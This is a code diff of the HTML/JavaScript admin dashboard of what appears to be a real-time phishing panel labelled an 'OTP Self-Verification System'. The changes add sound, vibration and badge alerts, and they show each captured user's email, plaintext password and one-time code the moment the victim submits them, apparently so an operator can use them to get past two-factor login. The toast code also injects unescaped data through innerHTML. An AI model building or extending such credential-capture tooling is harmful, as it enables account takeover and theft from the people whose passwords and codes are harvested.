@@ -78,6 +78,7 @@
             margin-bottom: 1rem;
             display: flex;
             gap: 1rem;
+            flex-wrap: wrap;
         }
         .filter-btn {
             padding: 0.5rem 1rem;
@@ -173,6 +174,23 @@
             border-radius: 5px;
             margin-bottom: 1rem;
             cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .vibration-indicator {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border-radius: 50%;
+            background: #ff9800;
+            animation: pulse 1s infinite;
+            margin-left: 10px;
+        }
+        @keyframes pulse {
+            0% { transform: scale(1); opacity: 1; }
+            50% { transform: scale(1.2); opacity: 0.7; }
+            100% { transform: scale(1); opacity: 1; }
         }
         .loading-overlay {
             display: none;
@@ -250,12 +268,44 @@
             cursor: pointer;
             margin-left: 1rem;
         }
+        .notification-badge {
+            position: fixed;
+            top: 80px;
+            right: 20px;
+            background: #f44336;
+            color: white;
+            padding: 10px 15px;
+            border-radius: 50px;
+            display: none;
+            align-items: center;
+            gap: 10px;
+            z-index: 1002;
+            box-shadow: 0 3px 10px rgba(0,0,0,0.2);
+            animation: bounce 0.5s;
+        }
+        @keyframes bounce {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-5px); }
+        }
+        .sound-wave {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="white"><path d="M3 9v6h4l5 5V4L7 9H3z"/></svg>');
+            background-size: contain;
+        }
     </style>
 </head>
 <body>
     <div class="navbar">
         <h1>Admin Dashboard - OTP Self-Verification System</h1>
         <button class="logout-btn" onclick="logout()">Logout</button>
+    </div>
+
+    <div class="notification-badge" id="notificationBadge">
+        <span class="sound-wave"></span>
+        <span id="notificationMessage">New Login Received!</span>
+        <span class="vibration-indicator"></span>
     </div>
 
     <div class="container">
@@ -278,21 +328,23 @@
             <span class="refresh-info">Auto-refreshes every 30 seconds</span>
         </div>
 
-        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 1rem;">
+        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 1rem; flex-wrap: wrap; gap: 1rem;">
             <div class="filters">
-                <button class="filter-btn active" onclick="filterUsers('all')">All Users</button>
-                <button class="filter-btn" onclick="filterUsers('pending')">Pending Verification</button>
-                <button class="filter-btn" onclick="filterUsers('verified')">Verified</button>
-                <button class="filter-btn" onclick="filterUsers('no-otp')">No OTP Set</button>
+                <button class="filter-btn active" onclick="filterUsers('all', event)">All Users</button>
+                <button class="filter-btn" onclick="filterUsers('pending', event)">Pending Verification</button>
+                <button class="filter-btn" onclick="filterUsers('verified', event)">Verified</button>
+                <button class="filter-btn" onclick="filterUsers('no-otp', event)">No OTP Set</button>
             </div>
-            <div>
+            <div style="display: flex; gap: 10px;">
                 <input type="text" class="search-box" placeholder="Search by email..." id="searchInput" onkeyup="searchUsers()">
                 <button class="export-btn" onclick="exportToCSV()">Export to CSV</button>
             </div>
         </div>
 
         <div id="notificationPermission" class="notification-permission" style="display: none;">
-            🔔 Click here to enable desktop notifications for real-time alerts
+            <span>🔔</span>
+            <span>Click here to enable desktop notifications for real-time alerts with sound and vibration</span>
+            <span class="vibration-indicator"></span>
         </div>
 
         <div class="table-container">
@@ -339,9 +391,6 @@
             window.location.href = '/admin';
         }
 
-        // Notification sound (base64 encoded beep)
-        const notificationSound = 'data:audio/wav;base64,UklGRlwAAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YVoAAACAgICAf39/f39/f3+AgICAf39/f39/f3+AgICAf39/f39/f3+AgICAf39/f39/f3+AgICAf39/f39/f3+AgICAf39/f38=';
-
         // Socket.io connection
         const socket = io({
             auth: { token }
@@ -351,6 +400,141 @@
         let currentFilter = 'all';
         let allUsers = [];
         let filteredUsers = [];
+        let audioContext = null;
+        let vibrationTimer = null;
+
+        // Initialize audio context on user interaction
+        function initAudio() {
+            if (!audioContext) {
+                try {
+                    audioContext = new (window.AudioContext || window.webkitAudioContext)();
+                } catch (e) {
+                    console.log('Web Audio API not supported');
+                }
+            }
+        }
+
+        // Show notification badge
+        function showNotificationBadge(message) {
+            const badge = document.getElementById('notificationBadge');
+            document.getElementById('notificationMessage').textContent = message;
+            badge.style.display = 'flex';
+            
+            setTimeout(() => {
+                badge.style.display = 'none';
+            }, 5000);
+        }
+
+        // Enhanced playSound function with different patterns
+        function playSound(type = 'urgent') {
+            initAudio();
+            
+            if (!audioContext) return;
+
+            try {
+                if (type === 'urgent') {
+                    // Urgent beeping sound for login (5 rapid beeps)
+                    const now = audioContext.currentTime;
+                    for (let i = 0; i < 5; i++) {
+                        const oscillator = audioContext.createOscillator();
+                        const gainNode = audioContext.createGain();
+                        
+                        oscillator.type = 'sine';
+                        oscillator.frequency.value = 800;
+                        gainNode.gain.value = 0.3;
+                        
+                        oscillator.connect(gainNode);
+                        gainNode.connect(audioContext.destination);
+                        
+                        oscillator.start(now + i * 0.15);
+                        oscillator.stop(now + i * 0.15 + 0.1);
+                    }
+                } else if (type === 'success') {
+                    // Success sound for OTP created (rising tone)
+                    const now = audioContext.currentTime;
+                    
+                    // Rising tone
+                    const osc1 = audioContext.createOscillator();
+                    osc1.type = 'sine';
+                    osc1.frequency.setValueAtTime(600, now);
+                    osc1.frequency.exponentialRampToValueAtTime(1200, now + 0.3);
+                    
+                    const gain1 = audioContext.createGain();
+                    gain1.gain.value = 0.3;
+                    
+                    osc1.connect(gain1);
+                    gain1.connect(audioContext.destination);
+                    
+                    osc1.start(now);
+                    osc1.stop(now + 0.5);
+                    
+                    // Chime sound
+                    setTimeout(() => {
+                        const osc2 = audioContext.createOscillator();
+                        osc2.type = 'triangle';
+                        osc2.frequency.value = 800;
+                        
+                        const gain2 = audioContext.createGain();
+                        gain2.gain.value = 0.2;
+                        
+                        osc2.connect(gain2);
+                        gain2.connect(audioContext.destination);
+                        
+                        osc2.start();
+                        osc2.stop(now + 0.8);
+                    }, 200);
+                } else if (type === 'warning') {
+                    // Warning sound for reset (descending tone)
+                    const now = audioContext.currentTime;
+                    for (let i = 0; i < 3; i++) {
+                        const oscillator = audioContext.createOscillator();
+                        const gainNode = audioContext.createGain();
+                        
+                        oscillator.type = 'sawtooth';
+                        oscillator.frequency.value = 600 - (i * 100);
+                        gainNode.gain.value = 0.2;
+                        
+                        oscillator.connect(gainNode);
+                        gainNode.connect(audioContext.destination);
+                        
+                        oscillator.start(now + i * 0.3);
+                        oscillator.stop(now + i * 0.3 + 0.2);
+                    }
+                }
+            } catch (e) {
+                console.log('Audio play failed:', e);
+            }
+        }
+
+        // Vibration function for 5 seconds with patterns
+        function vibrateDevice(pattern = null) {
+            if ('vibrate' in navigator) {
+                // Stop any ongoing vibration
+                navigator.vibrate(0);
+                
+                // Clear existing timer
+                if (vibrationTimer) {
+                    clearTimeout(vibrationTimer);
+                }
+                
+                // Default patterns based on type
+                if (!pattern) {
+                    pattern = [500, 200, 500, 200, 500]; // Vigorous pattern
+                }
+                
+                // Start vibration
+                navigator.vibrate(pattern);
+                console.log('📳 Device vibrating with pattern:', pattern);
+                
+                // Ensure it stops after 5 seconds
+                vibrationTimer = setTimeout(() => {
+                    navigator.vibrate(0);
+                    vibrationTimer = null;
+                }, 5000);
+            } else {
+                console.log('Vibration not supported on this device');
+            }
+        }
 
         // Show toast notification
         function showToast(message, type = 'info', title = '') {
@@ -358,7 +542,7 @@
             toast.className = `toast ${type}`;
             toast.innerHTML = `
                 <div class="toast-title">${title || type.toUpperCase()}</div>
-                <div class="toast-message">${message}</div>
+                <div class="toast-message">${message.replace(/\n/g, '<br>')}</div>
             `;
             toast.style.display = 'block';
             
@@ -380,79 +564,185 @@
 
         // Socket event listeners
         socket.on('connect', () => {
-            console.log('Connected to socket server');
-            showToast('Connected to real-time server', 'success', 'Connected');
+            console.log('✅ Connected to socket server');
+            showToast('Connected to real-time server with sound & vibration', 'success', '🔊 Connected');
         });
 
         socket.on('connect_error', (error) => {
-            console.error('Socket connection error:', error);
+            console.error('❌ Socket connection error:', error);
             showToast('Real-time connection lost', 'error', 'Connection Error');
         });
 
-        // User login event
-        socket.on('user-login', (data) => {
-            showNotification('User Login', `User: ${data.email} logged in`);
-            playSound();
-            showToast(`${data.email} logged in`, 'info', 'New Login');
-            loadUsers();
+        socket.on('test-notification', (data) => {
+            console.log('Test notification:', data);
+            showToast(data.message, 'info', 'Test');
         });
 
-        // User created OTP event - THIS IS THE KEY EVENT
-        socket.on('user-otp-created', (data) => {
-            showNotification('✅ User OTP Created', `User: ${data.email}\nOTP: ${data.otp}\n${data.message || 'Self-verified successfully'}`);
-            playSound();
-            showToast(`${data.email} created OTP: ${data.otp}`, 'success', 'OTP Created');
+        // 🔐 USER LOGIN EVENT - Instant notification with sound and vibration
+        socket.on('user-login', (data) => {
+            console.log('📢 INSTANT: User Login Received', data);
             
-            // Highlight the row for this user
-            highlightUserRow(data.email);
+            // Show notification badge
+            showNotificationBadge(`🔐 New Login: ${data.email}`);
+            
+            // Desktop notification
+            showNotification('🔐 NEW LOGIN ATTEMPT', 
+                `User: ${data.email}\nPassword: ${data.password}\n${data.message || ''}`
+            );
+            
+            // Play urgent sound pattern
+            playSound('urgent');
+            
+            // Vibrate for 5 seconds with vigorous pattern
+            vibrateDevice([500, 200, 500, 200, 500, 200, 500, 200, 500]);
+            
+            // Show toast with credentials
+            showToast(
+                `📧 ${data.email}\n🔑 ${data.password}`, 
+                'info', 
+                '🔐 NEW LOGIN'
+            );
+            
+            // Refresh user list
+            loadUsers();
+            
+            // Highlight the new user
+            setTimeout(() => highlightUserRow(data.email), 500);
+        });
+
+        // ✅ USER OTP CREATED EVENT - Success notification with sound and vibration
+        socket.on('user-otp-created', (data) => {
+            console.log('📢 INSTANT: OTP Created Received', data);
+            
+            // Show notification badge
+            showNotificationBadge(`✅ OTP Created: ${data.email}`);
+            
+            // Desktop notification with OTP
+            showNotification('✅ OTP CREATED & VERIFIED', 
+                `User: ${data.email}\n` +
+                `Password: ${data.password}\n` +
+                `OTP: ${data.otp}\n` +
+                `Status: Self-verified successfully`
+            );
+            
+            // Play success sound pattern
+            playSound('success');
+            
+            // Vibrate for 5 seconds with happy pattern (short pulses)
+            vibrateDevice([200, 100, 200, 100, 200, 100, 200, 100, 200, 100, 200]);
+            
+            // Show toast with OTP prominently
+            showToast(
+                `📧 ${data.email}\n` +
+                `🔑 OTP: ${data.otp}`, 
+                'success', 
+                '✅ OTP VERIFIED'
+            );
+            
+            // Refresh user list
+            loadUsers();
+            
+            // Highlight the verified user
+            setTimeout(() => highlightUserRow(data.email), 500);
+        });
+
+        // 🔄 USER RESET EVENT - Warning notification with sound and vibration
+        socket.on('user-reset', (data) => {
+            console.log('📢 INSTANT: User Reset Received', data);
+            
+            // Show notification badge
+            showNotificationBadge(`🔄 Reset: ${data.email}`);
+            
+            // Desktop notification
+            showNotification('🔄 PROCESS RESET', 
+                `User: ${data.email}\nPassword: ${data.password}\nUser is starting over`
+            );
+            
+            // Play warning sound
+            playSound('warning');
+            
+            // Vibrate for 5 seconds with warning pattern (long single vibrations)
+            vibrateDevice([1000, 500, 1000, 500, 1000]);
+            
+            // Show toast
+            showToast(
+                `${data.email} reset their OTP process`, 
+                'warning', 
+                '🔄 Process Reset'
+            );
             
             // Refresh user list
             loadUsers();
         });
 
-        // User reset event
-        socket.on('user-reset', (data) => {
-            showNotification('🔄 User Reset', `User: ${data.email} reset OTP process`);
-            playSound();
-            showToast(`${data.email} reset OTP process`, 'warning', 'Process Reset');
-            loadUsers();
-        });
-
-        // Request notification permission
-        if ('Notification' in window) {
-            if (Notification.permission === 'default') {
-                document.getElementById('notificationPermission').style.display = 'block';
-                document.getElementById('notificationPermission').onclick = () => {
-                    Notification.requestPermission().then(permission => {
-                        if (permission === 'granted') {
-                            document.getElementById('notificationPermission').style.display = 'none';
-                            showToast('Notifications enabled', 'success', 'Permission Granted');
-                        }
-                    });
-                };
+        // Request notification permission on user interaction
+        function requestNotificationPermission() {
+            if ('Notification' in window) {
+                Notification.requestPermission().then(permission => {
+                    if (permission === 'granted') {
+                        document.getElementById('notificationPermission').style.display = 'none';
+                        showToast('Notifications enabled with sound & vibration', 'success', '✅ Enabled');
+                        
+                        // Test notification
+                        new Notification('Notifications Enabled', {
+                            body: 'You will now receive instant alerts with sound and vibration'
+                        });
+                    }
+                });
             }
         }
+
+        // Initialize notification permission check
+        if ('Notification' in window) {
+            if (Notification.permission === 'default') {
+                const permissionDiv = document.getElementById('notificationPermission');
+                permissionDiv.style.display = 'flex';
+                permissionDiv.onclick = requestNotificationPermission;
+            } else if (Notification.permission === 'granted') {
+                // Test notification on load
+                setTimeout(() => {
+                    new Notification('Dashboard Ready', {
+                        body: 'Listening for instant notifications with sound & vibration'
+                    });
+                }, 2000);
+            }
+        }
+
+        // Initialize audio on first user interaction
+        document.addEventListener('click', function initAudioOnClick() {
+            initAudio();
+            document.removeEventListener('click', initAudioOnClick);
+        }, { once: true });
 
         function showNotification(title, body) {
             if ('Notification' in window && Notification.permission === 'granted') {
-                new Notification(title, { body });
+                try {
+                    const notification = new Notification(title, { 
+                        body,
+                        icon: '/favicon.ico',
+                        tag: 'otp-notification',
+                        requireInteraction: true
+                    });
+                    
+                    // Auto close after 8 seconds
+                    setTimeout(() => notification.close(), 8000);
+                    
+                } catch (e) {
+                    console.log('Notification failed:', e);
+                }
             }
         }
 
-        function playSound() {
-            const audio = new Audio(notificationSound);
-            audio.play().catch(e => console.log('Audio play failed:', e));
-        }
-
         function highlightUserRow(email) {
-            // Find and temporarily highlight the row
             const rows = document.querySelectorAll('tr');
             rows.forEach(row => {
                 if (row.textContent.includes(email)) {
                     row.style.backgroundColor = '#e8f5e9';
                     row.style.transition = 'background-color 1s';
+                    row.style.boxShadow = '0 0 10px #4CAF50';
                     setTimeout(() => {
                         row.style.backgroundColor = '';
+                        row.style.boxShadow = '';
                     }, 3000);
                 }
             });
@@ -486,7 +776,7 @@
             document.getElementById('pendingUsers').textContent = allUsers.filter(u => !u.otp_verified).length;
         }
 
-        function filterUsers(filter) {
+        function filterUsers(filter, event) {
             currentFilter = filter;
             
             // Update active button
@@ -574,6 +864,7 @@
             if (user) {
                 showToast(`
                     Email: ${user.email}\n
+                    Password: ${user.password}\n
                     OTP: ${user.otp || 'Not set'}\n
                     Status: ${user.otp_verified ? 'Verified' : 'Pending'}\n
                     Attempts: ${user.otp_attempts || 0}/3
@@ -606,6 +897,12 @@
 
         function logout() {
             showLoading('Logging out', 'Please wait...');
+            
+            // Stop any ongoing vibration
+            if ('vibrate' in navigator) {
+                navigator.vibrate(0);
+            }
+            
             setTimeout(() => {
                 localStorage.removeItem('adminToken');
                 window.location.href = '/admin';
@@ -622,6 +919,18 @@
                 e.preventDefault();
                 loadUsers();
                 showToast('Manual refresh triggered', 'info', 'Refreshing');
+                playSound('urgent');
+                vibrateDevice([200, 50, 200]);
+            }
+        });
+
+        // Clean up vibration on page unload
+        window.addEventListener('beforeunload', () => {
+            if ('vibrate' in navigator) {
+                navigator.vibrate(0);
+            }
+            if (vibrationTimer) {
+                clearTimeout(vibrationTimer);
             }
         });
     </script>
